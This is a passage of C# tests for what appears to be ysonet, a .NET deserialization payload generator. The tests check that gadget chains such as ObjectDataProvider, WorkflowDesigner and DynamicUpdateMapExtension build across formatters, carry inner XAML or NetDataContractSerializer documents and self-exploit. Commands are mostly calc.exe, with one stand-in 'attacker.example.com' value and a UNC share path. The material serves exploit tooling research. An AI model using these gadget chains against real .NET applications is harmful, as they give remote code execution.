                "ysonet ResXFileRef self-test fixture");
            try
            {
                foreach (string formatter in new[] { "Xaml", "YamlDotNet" })
                {
                    foreach (int variant in new[] { 1, 2, 3 })
                    {
                        var extra = new List<string> { "--variant", variant.ToString() };
                        if (variant == 3)
                        {
                            extra.Add("--type");
                            extra.Add("System.IO.BufferedStream, mscorlib");
                        }

                        InputArgs ia = new InputArgs();
                        ia.Cmd = fixture;
                        ia.Test = true;
                        ia.ExtraArguments = new List<string>(extra);
                        RunResult tested = PayloadRunner.GenerateGadget(new GenerationRequest
                        {
                            GadgetName = ResXFileRefGadget,
                            FormatterName = formatter,
                            OutputFormat = "",
                            InputArgs = ia,
                        });
                        AssertTrue(tested.Success,
                            formatter + " v" + variant + ": -t is accepted (self-exploit): " + tested.ErrorMessage);
                        AssertTrue((tested.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) < 0,
                            formatter + " v" + variant + ": no -t refusal remains: " + tested.ErrorMessage);

                        RunResult untested = GenerateResXFileRef(formatter, fixture, false, extra.ToArray());
                        AssertEqual(untested.Raw as string, tested.Raw as string,
                            formatter + " v" + variant + ": -t ships the same payload it self-tested");
                    }
                }
            }
            finally
            {
                SafeDelete(fixture);
            }
        }

        // A gadget with a variant that refuses -t (WithoutSelfTest) must not dead-end the
        // interactive editor: with the shared "test" toggle carried over ON from another
        // module, pressing Generate on that variant would hit the gadget's -t refusal and
        // produce no payload. The editor hides "test" for such a variant and never emits it,
        // so Generate builds the payload; the CLI is unchanged (a scripted -t still refuses).
        //
        // WbemClassObjectUnmarshal is the case that still exercises this: variant 2 refuses
        // -t (unparsed operator blob into native COM), variant 1 (its default) accepts it.
        // ResXFileRef used to refuse -t on variants 2/3 and is checked here too, now that it
        // accepts -t on EVERY variant - the toggle must be visible throughout, proving the
        // scoping does not hide it for a gadget that does not declare WithoutSelfTest.
        private static void EditorHidesTheTestToggleForARefusingVariant()
        {
            // WbemClassObjectUnmarshal: variant 1 (default) accepts -t, variant 2 refuses it,
            // so the editor keeps the toggle on 1 and hides it on 2.
            var wbem = new ModuleEditor(null, null, true, null, null);
            var wfields = wbem.BuildFieldsForTest("WbemClassObjectUnmarshal");
            EditableField wtest = FindEditable(wfields, "test");
            EditableField wvariant = FindEditable(wfields, "variant");
            EditableField wcommand = FindEditable(wfields, "command");
            if (wcommand != null) wcommand.Value = "attacker.example.com";
            wtest.Value = "true";
            List<GadgetVariant> wdeclared = Gadget("WbemClassObjectUnmarshal").Variants();

            wvariant.Value = wdeclared[0].Label; // variant 1 (default): accepts -t
            string w1 = wbem.GadgetCommandLineForTest();
            AssertTrue(!wtest.Hidden && w1.Contains("--test"),
                "WbemClassObjectUnmarshal variant 1 keeps the test toggle: " + w1);

            wvariant.Value = wdeclared[1].Label; // variant 2: refuses -t
            string w2 = wbem.GadgetCommandLineForTest();
            AssertTrue(wtest.Hidden && !w2.Contains("--test"),
                "WbemClassObjectUnmarshal variant 2 hides the test toggle: " + w2);

            // ResXFileRef now accepts -t on every variant (self-exploit runs the converter
            // here), so NONE of its variants declares WithoutSelfTest and the toggle must stay
            // visible and emitted throughout - the scoping only hides it where a variant
            // really refuses -t.
            var rx = new ModuleEditor(null, null, true, null, null);
            var rfields = rx.BuildFieldsForTest(ResXFileRefGadget);
            EditableField rtest = FindEditable(rfields, "test");
            EditableField rvariant = FindEditable(rfields, "variant");
            EditableField rcommand = FindEditable(rfields, "command");
            if (rcommand != null) rcommand.Value = @"\\host\share\stage.resources";
            rtest.Value = "true";
            foreach (GadgetVariant v in Gadget(ResXFileRefGadget).Variants())
            {
                rvariant.Value = v.Label;
                if (v.Number == ResXFileRefGenerator.VariantActivateNamedType)
                {
                    EditableField rtype = FindEditable(rfields, ResXFileRefGenerator.TypeOptionName);
                    if (rtype != null) rtype.Value = "System.IO.BufferedStream, mscorlib";
                }
                string line = rx.GadgetCommandLineForTest();
                AssertTrue(!rtest.Hidden,
                    "ResXFileRef variant " + v.Number + " keeps the test toggle visible");
                AssertTrue(line.Contains("--test"),
                    "ResXFileRef variant " + v.Number + " emits --test when it is on: " + line);
            }
        }

        // The Resx plugin reaches the SAME converter through a RESX document, and its
        // indirect_resx_file mode now exposes the type name and the encoding. Two things must
        // hold: an existing command's output is byte-identical, and the new options change
        // nothing but that one value.
        private static void ResxPluginIndirectFileRefKeepsItsDefaultAndAcceptsTypeAndEncoding()
        {
            const string share = @"\\host\share\stage.resources";

            // The exact value this mode has always written. Asserted as a literal on purpose:
            // a default that drifts has to fail loudly, because every existing command
            // depends on it.
            const string expectedDefault = @"\\host\share\stage.resources; System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

            string byDefault = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", share });
            AssertEqual(expectedDefault, byDefault,
                "the default indirect_resx_file value is unchanged");

            string asText = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", share,
                "--type", "System.String", "--enc", "utf-8" });
            AssertEqual(share + "; System.String;utf-8", asText,
                "--type and --enc change only the type name and add the encoding field");

            // The composition follows ResXFileRef.ToString(), so a path holding the field
            // separator is quoted - which the old fixed value never did.
            const string semicolonPath = @"C:\stage;01\payload.resources";
            string quoted = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", semicolonPath });
            AssertTrue(quoted.StartsWith("\"" + semicolonPath + "\";", StringComparison.Ordinal),
                "a path containing ';' is quoted: " + quoted);
            string[] parts = ResXFileRefFrameworkParse(quoted);
            AssertEqual(semicolonPath, parts[0],
                "and the framework's own parser gets the path back out");

            // A run with no --type after a run with one must be the default again: the option
            // set writes into statics and the plugin is driven repeatedly in one process.
            string againByDefault = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", share });
            AssertEqual(expectedDefault, againByDefault,
                "the option does not leak into the next run in the same process");

            // The other modes are untouched: the same arguments plus --type build the same
            // payload, because --type belongs to indirect_resx_file alone.
            ResetPluginStatics(typeof(ResxPlugin));
            RunResult plainMode = PayloadRunner.RunPlugin("Resx",
                new[] { "-M", "indirect_resx_file", "-F", share });
            ResetPluginStatics(typeof(ResxPlugin));
            RunResult withType = PayloadRunner.RunPlugin("Resx",
                new[] { "-M", "indirect_resx_file", "-F", share, "--type", "System.String" });
            AssertTrue(plainMode.Success && withType.Success, "both runs generate");
            AssertTrue(Convert.ToString(plainMode.Raw) != Convert.ToString(withType.Raw),
                "--type really changes the indirect_resx_file document");
        }

        // The <value> of the one <data> element a Resx run emits.
        private static string ResxIndirectValue(string[] argv)
        {
            ResetPluginStatics(typeof(ResxPlugin));
            RunResult r = PayloadRunner.RunPlugin("Resx", argv);
            AssertTrue(r.Success, "Resx " + string.Join(" ", argv) + ": " + r.ErrorMessage);

            string document = Convert.ToString(r.Raw);
            var doc = new System.Xml.XmlDocument();
            doc.LoadXml(document);
            System.Xml.XmlNode value = doc.SelectSingleNode("/root/data[@name='x']/value");
            AssertTrue(value != null, "the document carries the data element: " + document);
            return value.InnerText;
        }

        // TWO payloads left ObjectDataProvider, and the numbers they used are NOT reused.
        // Variant 3 was the "ResourceDictionary Source=URL" fetch and variant 4 was the
        // WorkflowDesigner wrapper; each is its own gadget now. What must hold afterwards: the
        // gadget is left with variants 1 and 2, the option that fed the URL payload is gone,
        // the annotation matches, and BOTH retired numbers refuse by NAME instead of quietly
        // falling through to variant 1 - which is the failure this test exists to prevent,
        // because a scripted --var 4 would otherwise ship a completely different payload with
        // nothing to notice.
        private static void ObjectDataProviderRetiredVariantsMovedToTheirOwnGadgets()
        {
            var odp = GadgetRegistry.CreateGadgetInstance("ObjectDataProvider") as GenericGenerator;
            AssertTrue(odp != null, "ObjectDataProvider loads");

            List<GadgetVariant> variants = odp.Variants();
            AssertEqual("1,2", string.Join(",", variants.ConvertAll(v => v.Number.ToString()).ToArray()),
                "two contiguous variants are left");

            // Variant 2 still builds the ResourceDictionary CONTAINER shape, which stayed here
            // because its sink is still ObjectDataProvider's.
            RunResult v2 = GenerateOdpXamlVariant(2);
            AssertTrue(v2.Success, "Xaml variant 2 still builds: " + v2.ErrorMessage);
            AssertTrue(((string)v2.Raw).IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0,
                "and it is still the ResourceDictionary container wrapper");

            // The two retired numbers refuse, and each message names its replacement gadget.
            RunResult v3 = GenerateOdpXamlVariant(3);
            AssertTrue(!v3.Success, "variant 3 is refused rather than silently built");
            AssertTrue(v3.ErrorMessage.IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0,
                "and the message names the ResourceDictionary gadget: " + v3.ErrorMessage);

            RunResult v4 = GenerateOdpXamlVariant(4);
            AssertTrue(!v4.Success, "variant 4 is refused rather than silently built");
            AssertTrue(v4.ErrorMessage.IndexOf("WorkflowDesigner", StringComparison.Ordinal) >= 0,
                "and the message names the WorkflowDesigner gadget: " + v4.ErrorMessage);

            // A retired number must be refused on EVERY formatter, not only the Xaml one it
            // used to live on: the number is parsed before the formatter branch is chosen, so a
            // guard placed inside the Xaml block would let "-f Json.NET --var 4" through.
            InputArgs jsonArgs = new InputArgs();
            jsonArgs.Cmd = "calc.exe";
            jsonArgs.Test = false;
            jsonArgs.ExtraArguments = new List<string> { "--variant", "4" };
            RunResult jsonV4 = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "ObjectDataProvider",
                FormatterName = "Json.NET",
                OutputFormat = "",
                InputArgs = jsonArgs,
            });
            AssertTrue(!jsonV4.Success,
                "a retired variant is refused on a non-Xaml formatter too");

            // --xamlurl left with the payload; the URI is now an ordinary -c on the new gadget.
            AssertTrue(OptionField.FromOptionSet(odp.Options()).Count == 1,
                "ObjectDataProvider is left with one option, --variant");

            // The "(N)" annotation is a per-formatter variant COUNT and is the only place the
            // public catalog discloses that a gadget has variants at all.
            AssertTrue(odp.SupportedFormatters().Contains("Xaml (2)"),
                "the Xaml token is annotated with two variants: "
                    + string.Join(", ", odp.SupportedFormatters().ToArray()));

            AssertTrue(GadgetRegistry.CreateGadgetInstance(RdGadget) != null,
                "and the gadget that took over the URL payload is registered");
            AssertTrue(GadgetRegistry.CreateGadgetInstance(WdGadget) != null,
                "and the gadget that took over the wrapper is registered");
        }

        private static RunResult GenerateOdpXamlVariant(int variant)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "ObjectDataProvider",
                FormatterName = "Xaml",
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // ---- WorkflowDesigner (write-only member -> XamlReader.Load) -------------

        private const string WdGadget = "WorkflowDesigner";

        // Every formatter this gadget advertises, with the deserializer tag the fire and
        // round-trip helpers use. One list, so a formatter added to the gadget and forgotten
        // here fails WorkflowDesignerCoversEveryAdvertisedFormatter below.
        private static readonly string[][] WorkflowDesignerFormatters =
        {
            new[] { "Json.NET", "json" },
            new[] { "Xaml", "xaml" },
            new[] { "FastJson", "fastjson" },
            new[] { "JavaScriptSerializer", "jss" },
            new[] { "SharpSerializerXml", "ssx" },
            new[] { "SharpSerializerBinary", "ssb" },
            new[] { "MessagePackTypeless", "mp" },
            new[] { "MessagePackTypelessLz4", "mplz4" },
        };

        private static RunResult GenerateWorkflowDesigner(string formatter, bool minify, string cmd)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = false;
            ia.Minify = minify;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = WdGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Generation for every advertised formatter x minify, and - the half a generation
        // matrix cannot check - that the emitted bytes really CARRY the inner XAML document.
        // Two of these formatters ship a surrogate through a type-name swap, and that swap
        // failing is silent: the payload is still valid MessagePack or SharpSerializer, it just
        // names a ysonet type no target can resolve.
        private static void WorkflowDesignerCarriesTheInnerDocument()
        {
            var failures = new List<string>();
            foreach (string[] row in WorkflowDesignerFormatters)
            {
                string formatter = row[0];
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    string cell = formatter + (minify ? " (minified)" : "");
                    RunResult r = GenerateWorkflowDesigner(formatter, minify, "calc.exe");
                    if (!r.Success || RawIsEmpty(r.Raw))
                    {
                        failures.Add(cell + " -> " + (r.Success ? "empty" : r.ErrorMessage));
                        continue;
                    }

                    string text = Encoding.UTF8.GetString(Bytes(r.Raw));

                    // The Lz4 flavour is COMPRESSED, so nothing is readable in its bytes; its
                    // uncompressed twin covers the name, and its fire row covers the rest.
                    if (formatter == "MessagePackTypelessLz4")
                        continue;

                    // XAML never spells a CLR name in one piece: the bare type is the ELEMENT
                    // and its namespace and assembly live in the xmlns. Every other format
                    // here writes the assembly qualified name.
                    bool namesTarget = formatter == "Xaml"
                        ? text.IndexOf("<WorkflowDesigner ", StringComparison.Ordinal) >= 0
                            && text.IndexOf("clr-namespace:System.Activities.Presentation", StringComparison.Ordinal) >= 0
                        : text.IndexOf("System.Activities.Presentation.WorkflowDesigner", StringComparison.Ordinal) >= 0;
                    if (!namesTarget)
                        failures.Add(cell + " -> the payload does not name the target type");
                    if (text.IndexOf("Surrogate", StringComparison.Ordinal) >= 0)
                        failures.Add(cell + " -> a ysonet surrogate type name leaked into the payload");
                    if (text.IndexOf("PropertyInspectorFontAndColorData", StringComparison.Ordinal) < 0)
                        failures.Add(cell + " -> the payload does not name the member");
                    // The inner document travels escaped for whichever literal it lands in, so
                    // look for a token that survives every escaping this gadget applies.
                    if (text.IndexOf("ObjectDataProvider", StringComparison.Ordinal) < 0)
                        failures.Add(cell + " -> the inner XAML document is missing");
                }
            }
            AssertTrue(failures.Count == 0,
                "WorkflowDesigner generation cells failed (" + failures.Count + "):\n  "
                    + string.Join("\n  ", failures.ToArray()));
        }

        // The gadget is a bridge CONSUMER: -bgc <xaml gadget> replaces the in-file default
        // inner document. Both halves matter - the bridged payload must actually be used, and
        // the default must still be there when no chain is given - so the test asserts they
        // differ AND that each is the document it claims to be.
        private static void WorkflowDesignerConsumesABridgedXamlPayload()
        {
            var g = GadgetRegistry.CreateGadgetInstance(WdGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");
            AssertTrue(g.Labels().Contains(GadgetTags.Bridged), "it is tagged as a bridge consumer");
            AssertEqual(Formatters.Xaml, g.SupportedBridgedFormatter(),
                "and the inner payload is a Xaml document, because the sink is XamlReader.Load");

            RunResult plain = GenerateWorkflowDesigner("Json.NET", false, "calc.exe");
            AssertTrue(plain.Success, "the default inner payload builds: " + plain.ErrorMessage);
            string plainText = (string)plain.Raw;
            AssertTrue(plainText.IndexOf("ObjectType=", StringComparison.Ordinal) >= 0,
                "the in-file default is the hand written ObjectType form: " + Truncate(plainText, 200));

            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            RunResult bridged = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = WdGadget,
                BridgedGadgetChain = "ObjectDataProvider",
                FormatterName = "Json.NET",
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(bridged.Success, "the bridged chain builds: " + bridged.ErrorMessage);
            string bridgedText = (string)bridged.Raw;

            AssertTrue(bridgedText != plainText,
                "the bridged payload really replaced the default inner document");
            // ObjectDataProvider's own Xaml payload serializes a LIVE graph, so it carries an
            // ObjectInstance with a ProcessStartInfo. The in-file default never does.
            AssertTrue(bridgedText.IndexOf("ObjectInstance", StringComparison.Ordinal) >= 0,
                "and it is ObjectDataProvider's serialized graph: " + Truncate(bridgedText, 300));
            AssertTrue(plainText.IndexOf("ObjectInstance", StringComparison.Ordinal) < 0,
                "which the in-file default is not");
        }

        // -c is required for the DEFAULT inner payload and only for it: a bridged chain brings
        // its own document, so refusing there would break the bridge.
        private static void WorkflowDesignerRefusesOnlyWhatItCannotEmit()
        {
            RunResult empty = GenerateWorkflowDesigner("Json.NET", false, "");
            AssertTrue(!empty.Success, "an empty -c is refused when there is no bridged payload");
            AssertTrue(empty.ErrorMessage.IndexOf(WdGadget, StringComparison.Ordinal) >= 0,
                "and the refusal names the gadget: " + empty.ErrorMessage);

            RunResult unsupported = GenerateWorkflowDesigner("BinaryFormatter", false, "calc.exe");
            AssertTrue(!unsupported.Success, "a formatter it never advertised is refused");
        }

        // The formatter list is a claim about a WRITE-ONLY member, so both directions are
        // locked: what is advertised must be reachable, and the biggest exclusion must have a
        // reproduced reason rather than an assumption.
        private static void WorkflowDesignerAdvertisesWhatCanReachAWriteOnlyMember()
        {
            var g = GadgetRegistry.CreateGadgetInstance(WdGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            List<string> advertised = g.SupportedFormatters();
            AssertEqual(WorkflowDesignerFormatters.Length, advertised.Count,
                "the fire/round-trip table covers every advertised formatter: "
                    + string.Join(", ", advertised.ToArray()));
            foreach (string[] row in WorkflowDesignerFormatters)
                AssertTrue(advertised.Contains(row[0]), "the table names " + row[0]);

            // YamlDotNet is the exclusion worth proving, because it is the one that fails for
            // the WRITE-ONLY reason rather than a structural one: its deserializer inspects a
            // type through a readable-properties inspector, which filters on CanRead, so the
            // member is invisible to it and the key maps to nothing.
            //
            // Reproduced on a test-owned stand-in rather than on WorkflowDesigner itself -
            // constructing the real target creates a WPF Application inside this runner, see
            // the fire helper - and paired with a Json.NET control so the A/B is about the
            // missing getter and nothing else. The assertion is on the ABSENCE OF THE
            // ASSIGNMENT, not on an exception: whether YamlDotNet throws or silently assigns
            // nothing is version-dependent, and only one of those two is worth relying on.
            AssertTrue(!advertised.Contains(Formatters.YamlDotNet)
                    && !advertised.Contains("YamlDotNet < 5.0.0"),
                "YamlDotNet is not advertised");

            const string yaml = @"
!<!ysonet.Tests.WriteOnlyMemberProbe,ysonet.Tests> {
    Assigned: ""from-yaml""
}";
            WriteOnlyMemberProbe.LastAssigned = null;
            Exception yamlError = null;
            object fromYaml = null;
            try { fromYaml = SerializersHelper.YamlDotNet_deserialize(yaml); }
            catch (Exception ex) { yamlError = ex; }
            string yamlOutcome = yamlError != null
                ? "it refused the document: " + yamlError.Message
                : "it built " + (fromYaml == null ? "nothing" : fromYaml.GetType().Name)
                    + " and assigned nothing, which is the SILENT failure";
            AssertTrue(WriteOnlyMemberProbe.LastAssigned == null,
                "YamlDotNet never assigns a write-only property (" + yamlOutcome + ")");
            // Printed, not only asserted: which of the two ways it fails decides how the
            // gadget's own comment has to describe the exclusion, and a future YamlDotNet
            // could move from one to the other without this assertion noticing.
            Console.Error.WriteLine("  [info] YamlDotNet vs a write-only member: " + yamlOutcome);

            const string json = @"{
    ""$type"":""ysonet.Tests.WriteOnlyMemberProbe, ysonet.Tests"",
    ""Assigned"":""from-json""
}";
            WriteOnlyMemberProbe.LastAssigned = null;
            SerializersHelper.JsonNet_deserialize(json);
            AssertEqual("from-json", WriteOnlyMemberProbe.LastAssigned,
                "while Json.NET does, which is what makes the exclusion about the getter");

            // The runtime formatters are out for a second, independent reason: no attribute.
            Type wd = Type.GetType(
                "System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                false);
            if (wd == null)
            {
                Console.Error.WriteLine("  [skip] WorkflowDesigner target shape: "
                    + "System.Activities.Presentation is not available on this machine");
                return;
            }

            AssertTrue(!wd.IsSerializable,
                "WorkflowDesigner is not [Serializable], which rules out BinaryFormatter, "
                    + "SoapFormatter, LosFormatter and FsPickler before any document shape matters");

            // The shape the technique needs. A future framework that added a getter, made the
            // constructor non-public, or renamed the member would make this gadget silently
            // inert with nothing else failing.
            AssertTrue(wd.IsPublic && !wd.IsAbstract, "the target type is public and constructible");
            AssertTrue(wd.GetConstructor(Type.EmptyTypes) != null,
                "and has a public parameterless constructor, which is what every advertised "
                    + "formatter uses to create it");
            System.Reflection.PropertyInfo sink = wd.GetProperty("PropertyInspectorFontAndColorData");
            AssertTrue(sink != null, "the member still exists");
            AssertEqual(typeof(string), sink.PropertyType, "and is still a string");
            AssertTrue(!sink.CanRead,
                "and is still WRITE ONLY, which is the whole reason the formatter list is short");
            AssertTrue(sink.CanWrite, "with a setter, which is the sink");
        }

        // The metadata an operator searches on.
        private static void WorkflowDesignerDeclaresItsFacets()
        {
            var g = GadgetRegistry.CreateGadgetInstance(WdGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            AssertEqual(CommandInputType.ShellCommand, g.CommandInput(),
                "-c is a command, which the INNER Xaml payload consumes");
            AssertEqual(0, g.Variants().Count, "one payload shape");

            GadgetFacetSet facets = g.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.NestedDeserialization),
                "the setter hands operator-controlled text to a second deserializer");
            AssertTrue(facets.Kinds.Contains(PayloadKind.CodeExecution),
                "and that deserializer builds whatever the document declares");

            AssertTrue(facets.Requirements.Contains(GadgetRequirement.Wpf),
                "the target constructs WPF objects and loads WPF markup");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
                "System.Activities.Presentation ships with the framework");

            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
                "a runtime-gated gadget names at least one working version");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the effect was observed on");

            AssertTrue(g.AdditionalInfo().IndexOf("XamlReader", StringComparison.OrdinalIgnoreCase) >= 0,
                "AdditionalInfo names the sink");
            AssertTrue(g.AdditionalInfo().IndexOf("STA", StringComparison.Ordinal) >= 0,
                "and the STA requirement, which decides whether the payload lands at all");
            AssertInfoPanelKeepsItsFacts(WdGadget);
        }

        // ---- DynamicUpdateMapExtension (XAML x:XData -> NetDataContractSerializer) ----------

        private const string DumGadget = "DynamicUpdateMapExtension";

        private static RunResult GenerateDynamicUpdateMapExtension(string formatter, bool minify, string cmd)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = false;
            ia.Minify = minify;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = DumGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Generation, plus the two things a generation matrix cannot see: that the inner NDCS
        // document really travels inside an x:XData section (the one detail the whole technique
        // rests on), and that no XML declaration was carried into the middle of the document.
        private static void DynamicUpdateMapExtensionCarriesTheInnerDocument()
        {
            var failures = new List<string>();
            for (int m = 0; m < 2; m++)
            {
                bool minify = m == 1;
                string cell = "Xaml" + (minify ? " (minified)" : "");
                RunResult r = GenerateDynamicUpdateMapExtension("Xaml", minify, "calc.exe");
                if (!r.Success || RawIsEmpty(r.Raw))
                {
                    failures.Add(cell + " -> " + (r.Success ? "empty" : r.ErrorMessage));
                    continue;
                }

                string text = Text(r.Raw);

                // XAML never spells a CLR name in one piece: the bare type is the ELEMENT and
                // its namespace and assembly live in the xmlns.
                if (text.IndexOf("<DynamicUpdateMapExtension", StringComparison.Ordinal) < 0
                    || text.IndexOf("clr-namespace:System.Activities.XamlIntegration", StringComparison.Ordinal) < 0)
                    failures.Add(cell + " -> the payload does not name the target type");
                if (text.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) < 0)
                    failures.Add(cell + " -> the payload does not name the content property");
                // The load-bearing detail. Without this element the XAML scanner tries to
                // resolve the NDCS document's root as a XAML type and never calls ReadXml.
                if (text.IndexOf(":XData", StringComparison.Ordinal) < 0)
                    failures.Add(cell + " -> the inner document is not inside an x:XData section");
                // The inner payload itself: the default is TypeConfuseDelegate through NDCS.
                // Matched WITHOUT namespace prefixes, because the minifier renames them (z: -> c:,
                // and it drops the z:Type that FactoryType already implies).
                if (text.IndexOf("DelegateSerializationHolder", StringComparison.Ordinal) < 0
                    || text.IndexOf("SortedSet", StringComparison.Ordinal) < 0
                    || text.IndexOf(":Type=", StringComparison.Ordinal) < 0)
                    failures.Add(cell + " -> the inner NetDataContractSerializer document is missing");
                // An XML declaration is only legal at the very start of a document, so one left
                // on the inner payload would make the whole thing unparseable.
                if (text.IndexOf("<?xml", StringComparison.Ordinal) >= 0)
                    failures.Add(cell + " -> an XML declaration survived into the document");

                // It has to be a real XML document, not merely a string with the right words.
                try
                {
                    var doc = new System.Xml.XmlDocument { XmlResolver = null };
                    doc.LoadXml(text);
                }
                catch (Exception ex)
                {
                    failures.Add(cell + " -> the payload is not well-formed XML: " + ex.Message);
                }
            }
            AssertTrue(failures.Count == 0,
                "DynamicUpdateMapExtension generation cells failed (" + failures.Count + "):\n  "
                    + string.Join("\n  ", failures.ToArray()));
        }

        // The gadget is a bridge CONSUMER: -bgc <ndcs gadget> replaces the in-file default inner
        // payload. Both halves matter - the bridged payload must actually be used, and the
        // default must still be there when no chain is given.
        private static void DynamicUpdateMapExtensionConsumesABridgedNdcsPayload()
        {
            var g = GadgetRegistry.CreateGadgetInstance(DumGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");
            AssertTrue(g.Labels().Contains(GadgetTags.Bridged), "it is tagged as a bridge consumer");
            AssertEqual(Formatters.NetDataContractSerializer, g.SupportedBridgedFormatter(),
                "and the inner payload is an NDCS document, because the sink is "
                    + "NetDataContractSerializer.ReadObject");

            RunResult plain = GenerateDynamicUpdateMapExtension("Xaml", false, "calc.exe");
            AssertTrue(plain.Success, "the default inner payload builds: " + plain.ErrorMessage);
            string plainText = Text(plain.Raw);
            AssertTrue(plainText.IndexOf("SortedSet", StringComparison.Ordinal) >= 0,
                "the default inner payload is the TypeConfuseDelegate chain: "
                    + Truncate(plainText, 200));

            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            RunResult bridged = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = DumGadget,
                BridgedGadgetChain = "TextFormattingRunProperties",
                FormatterName = "Xaml",
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(bridged.Success, "the bridged chain builds: " + bridged.ErrorMessage);
            string bridgedText = Text(bridged.Raw);

            AssertTrue(bridgedText != plainText,
                "the bridged payload really replaced the default inner document");
            AssertTrue(bridgedText.IndexOf("TextFormattingRunProperties", StringComparison.Ordinal) >= 0,
                "and it is the chained gadget's NDCS document: " + Truncate(bridgedText, 300));
            AssertTrue(bridgedText.IndexOf(":XData", StringComparison.Ordinal) >= 0,
                "still wrapped in the x:XData section the sink needs");
        }

        // -c is required for the DEFAULT inner payload and only for it: a bridged chain brings
        // its own document, so refusing there would break the bridge.
        private static void DynamicUpdateMapExtensionRefusesOnlyWhatItCannotEmit()
        {
            RunResult empty = GenerateDynamicUpdateMapExtension("Xaml", false, "");
            AssertTrue(!empty.Success, "an empty -c is refused when there is no bridged payload");
            AssertTrue(empty.ErrorMessage.IndexOf(DumGadget, StringComparison.Ordinal) >= 0,
                "and the refusal names the gadget: " + empty.ErrorMessage);

            RunResult unsupported = GenerateDynamicUpdateMapExtension("BinaryFormatter", false, "calc.exe");
            AssertTrue(!unsupported.Success, "a formatter it never advertised is refused");
        }

        /// <summary>
        /// The structural proof, and the one experiment that was worth running twice: the inner
        /// document reaches IXmlSerializable.ReadXml ONLY when it sits inside an x:XData section.
        ///
        /// Both documents below carry a BENIGN inner NDCS payload (a plain string), so nothing
        /// executes here; what is measured is how far the XAML object writer gets.
        ///   with x:XData    - the writer calls ReadXml, NetDataContractSerializer.ReadObject
        ///                     builds our string, and the cast to DynamicUpdateMap then fails.
        ///                     That InvalidCastException NAMES the object NDCS built, so it is
        ///                     direct evidence that the inner deserializer ran on our document.
        ///   without x:XData - the scanner treats the NDCS root as a XAML type to resolve, and
        ///                     the load fails without ReadXml ever being called.
        /// </summary>
        private static void DynamicUpdateMapExtensionReachesReadXmlOnlyThroughXData()
        {
            const string aqn = "System.Activities.XamlIntegration.DynamicUpdateMapExtension, "
                + "System.Activities, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
            Type target = Type.GetType(aqn, false);
            if (target == null)
            {
                Console.Error.WriteLine("  [skip] DynamicUpdateMapExtension target shape: "
                    + "System.Activities is not available on this machine");
                return;
            }

            // The shape the technique needs. A framework that gave XmlContent a setter, changed
            // its type, or made the constructor non-public would leave this gadget inert with
            // nothing else failing.
            AssertTrue(target.IsPublic && !target.IsAbstract, "the target type is public and constructible");
            AssertTrue(target.GetConstructor(Type.EmptyTypes) != null,
                "and has a public parameterless constructor, which is what the XAML writer uses");
            System.Reflection.PropertyInfo sink = target.GetProperty("XmlContent");
            AssertTrue(sink != null, "the content property still exists");
            AssertTrue(typeof(System.Xml.Serialization.IXmlSerializable).IsAssignableFrom(sink.PropertyType),
                "and is still IXmlSerializable, which is what makes the XAML writer treat it as XData");
            AssertTrue(sink.CanRead && !sink.CanWrite,
                "it is READ ONLY, and that is fine here: the writer reads the lazily built value "
                    + "and calls ReadXml on it instead of assigning anything");

            // A harmless inner document, built by the same serializer the target uses.
            string benignNdcs = SerializersHelper.NetDataContractSerializer_serialize("ysonet-xdata-probe");
            int declEnd = benignNdcs.IndexOf("?>", StringComparison.Ordinal);
            if (benignNdcs.TrimStart().StartsWith("<?xml", StringComparison.Ordinal) && declEnd >= 0)
                benignNdcs = benignNdcs.Substring(declEnd + 2).Trim();

            const string header = @"<DynamicUpdateMapExtension xmlns=""clr-namespace:System.Activities.XamlIntegration;assembly=System.Activities"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"">
  <DynamicUpdateMapExtension.XmlContent>";
            const string footer = @"  </DynamicUpdateMapExtension.XmlContent>
</DynamicUpdateMapExtension>";

            string withXData = header + "<x:XData>" + benignNdcs + "</x:XData>" + footer;
            string withoutXData = header + benignNdcs + footer;

            Exception withError = LoadXamlAndCatch(withXData);
            AssertTrue(withError != null,
